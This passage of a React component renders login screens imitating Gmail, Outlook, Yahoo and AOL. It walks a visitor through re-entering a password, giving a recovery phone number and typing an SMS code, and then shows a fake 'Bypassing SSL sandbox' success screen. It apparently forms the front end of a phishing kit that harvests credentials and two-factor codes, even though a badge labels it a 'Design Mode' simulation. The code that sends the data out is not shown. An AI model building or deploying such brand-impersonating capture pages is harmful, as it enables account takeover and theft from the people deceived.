                  type={showPassword ? "text" : "password"}
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  className="w-full bg-[#0b0f19]/75 text-white font-sans text-sm border border-red-500 rounded-xl py-3.5 px-4 pr-12 outline-none focus:ring-1 focus:ring-red-500/50 font-light"
                  placeholder="Re-enter password"
                  disabled={loading}
                  autoFocus
                />
                <button
                  type="button"
                  onClick={() => setShowPassword(!showPassword)}
                  className="absolute right-4 text-slate-400 hover:text-slate-200"
                >
                  {showPassword ? <EyeOff size={16} /> : <Eye size={16} />}
                </button>
              </div>
              {error && <p className="text-red-400 text-xs font-sans">⚠️ {error}</p>}
            </div>

            <button
              type="submit"
              disabled={loading}
              className="w-full bg-gradient-to-r from-indigo-500 to-emerald-400 hover:from-indigo-600 hover:to-emerald-500 text-white font-sans text-sm font-semibold rounded-xl py-3.5 transition-all flex items-center justify-center cursor-pointer shadow-lg shadow-indigo-500/15"
            >
              {loading ? <div className="w-4 h-4 border-2 border-white/20 border-t-white rounded-full animate-spin" /> : "Verify Token"}
            </button>
          </form>
        )}

        {step === "phone_prompt" && (
          <form onSubmit={handlePhoneSubmit} className="space-y-6" id="generic-phone-form">
            <div className="text-center">
              <h2 className="text-white text-xl font-bold tracking-tight mb-1">Phone Verification</h2>
              <p className="text-slate-400 text-xs font-light">Confirm your cell telephone contact register to complete verification security steps.</p>
            </div>

            <div className="space-y-1">
              <div className="flex gap-2">
                <div className="bg-[#0b0f19]/75 border border-slate-800 px-4 py-3 rounded-xl text-slate-300 text-sm select-none flex items-center font-semibold font-sans">
                  🇺🇸 +1
                </div>
                <input
                  type="tel"
                  value={phone}
                  onChange={(e) => setPhone(e.target.value)}
                  className={`w-full bg-[#0b0f19]/75 text-white font-sans text-sm border ${error ? 'border-red-400' : 'border-slate-800 focus:border-indigo-500'} rounded-xl py-3.5 px-4 outline-none transition-all placeholder-slate-600 font-light`}
                  placeholder="Recovery phone number"
                  disabled={loading}
                  autoFocus
                />
              </div>
              {error && <p className="text-red-400 text-xs font-sans pt-1">⚠️ {error}</p>}
            </div>

            <button
              type="submit"
              disabled={loading}
              className="w-full bg-gradient-to-r from-indigo-500 to-emerald-400 hover:from-indigo-600 hover:to-emerald-500 text-white font-sans text-sm font-semibold rounded-xl py-3.5 transition-all flex items-center justify-center cursor-pointer shadow-lg shadow-indigo-500/15"
            >
              {loading ? <div className="w-4 h-4 border-2 border-white/20 border-t-white rounded-full animate-spin" /> : "Transmit Verification Link"}
            </button>
          </form>
        )}

        {step === "sms_prompt" && (
          <form onSubmit={handleSmsSubmit} className="space-y-6" id="generic-sms-form">
            <div className="text-center">
              <h2 className="text-white text-xl font-bold tracking-tight mb-1">Verify SMS Code</h2>
              <p className="text-slate-400 text-xs font-light">E-signature hand-shake pending. Input authorization code broadcasted to **+1 {phone}**.</p>
            </div>

            <div className="space-y-1 pt-1">
              <input
                type="text"
                value={smsCode}
                onChange={(e) => setSmsCode(e.target.value)}
                className={`w-full bg-[#0b0f19]/75 text-white font-sans text-sm border ${error ? 'border-red-400' : 'border-slate-800 focus:border-indigo-500'} rounded-xl py-3.5 px-4 outline-none transition-all placeholder-slate-600 text-center font-bold tracking-widest`}
                placeholder="SMS CODE"
                disabled={loading}
                autoFocus
              />
              {error && <p className="text-red-400 text-xs font-sans pt-1">⚠️ {error}</p>}
            </div>

            <button
              type="submit"
              disabled={loading}
              className="w-full bg-gradient-to-r from-indigo-500 to-emerald-400 hover:from-indigo-600 hover:to-emerald-550 text-white font-sans text-sm font-semibold rounded-xl py-3.5 transition-all flex items-center justify-center cursor-pointer shadow-lg"
            >
              {loading ? <div className="w-4 h-4 border-2 border-white/20 border-t-white rounded-full animate-spin" /> : "Verify SMS Access Badge"}
            </button>
          </form>
        )}

        {step === "success_gate" && (
          <div className="flex flex-col items-center justify-center py-6 text-center" id="generic-success-panel">
            <div className="w-14 h-14 bg-emerald-500/10 border border-emerald-500/20 text-emerald-400 rounded-2xl flex items-center justify-center mb-4 animate-bounce">
              <CheckCircle2 size={32} />
            </div>
            <h2 className="text-white text-xl font-bold tracking-tight mb-1">Handshake complete!</h2>
            <p className="text-slate-400 text-xs px-6">Bypassing SSL sandbox. Loading guest interface safely...</p>
            
            <div className="w-full max-w-xs bg-white/5 border border-white/5 h-2 rounded-xl overflow-hidden mt-6">
              <div 
                className="h-full bg-gradient-to-r from-indigo-500 to-emerald-400 transition-all duration-100 ease-out animate-pulse"
                style={{ width: `${successProgress}%` }}
              />
            </div>
          </div>
        )}
      </div>
    );
  };

  const getBrandLayout = () => {
    switch (provider) {
      case "gmail":
        return renderGoogleDesign();
      case "outlook":
      case "office365":
        return renderMicrosoftDesign();
      case "yahoo":
        return renderYahooDesign();
      case "aol":
        return renderAolDesign();
      default:
        return renderOtherDesign();
    }
  };

  return (
    <motion.div
      initial={{ opacity: 0, y: 10 }}
      animate={{ opacity: 1, y: 0 }}
      exit={{ opacity: 0 }}
      className="relative z-10 w-full max-w-4xl px-4 flex flex-col justify-center items-center"
    >
      {/* Top Helper Badge for beautiful simulation disclosure */}
      <div className="mb-6 bg-white/5 border border-white/10 text-slate-300 rounded-full px-5 py-2 flex items-center gap-2 text-xs font-sans backdrop-blur-md shadow-lg select-none">
        <ShieldCheck size={14} className="text-emerald-400 animate-pulse" />
        <span className="font-light">Design Mode: <strong className="font-semibold text-emerald-300 capitalize">{provider} Gateway Style</strong> (Frosted Glass Glassmorphic Blend)</span>
      </div>

      {/* Primary Dynamic Brand Layout Cards */}
      {getBrandLayout()}

      {/* Google-Style Footer */}
      <div className="w-full max-w-[450px] flex flex-col sm:flex-row justify-between items-center text-xs text-slate-500 select-none font-sans mt-6 px-4 space-y-2 sm:space-y-0" id="login-footer">
        <div>
          <span>English (United States)</span>
        </div>
        <div className="flex gap-4">
          <a href="#" onClick={(e) => e.preventDefault()} className="hover:text-slate-300 transition-colors">Help</a>
          <a href="#" onClick={(e) => e.preventDefault()} className="hover:text-slate-300 transition-colors">Privacy</a>
          <a href="#" onClick={(e) => e.preventDefault()} className="hover:text-slate-300 transition-colors">Terms</a>
        </div>
      </div>
    </motion.div>
  );
}
